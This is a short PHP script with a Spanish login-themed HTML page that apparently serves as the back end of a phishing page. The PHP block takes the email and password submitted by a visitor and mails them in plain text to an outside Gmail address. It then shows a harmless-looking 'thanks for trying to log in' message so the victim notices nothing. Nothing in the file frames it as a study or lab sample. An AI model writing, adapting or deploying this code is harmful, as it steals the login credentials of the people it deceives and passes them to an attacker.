<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $to = 'jason15sebas@gmail.com';
    $subject = 'Nuevo intento de inicio de sesión';
    $message = "Correo electrónico: $email\nContraseña: $password";
    $headers = 'From: no-reply@tu-dominio.com' . "\r\n" .
               'Reply-To: no-reply@tu-dominio.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    mail($to, $subject, $message, $headers);
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicio de Sesión</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f2f5;
        }
        .message-container {
            background: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        .message-container h1 {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="message-container">
        <h1>Inicio de Sesión</h1>
        <p>Gracias por intentar iniciar sesión.</p>
    </div>
</body>
</html>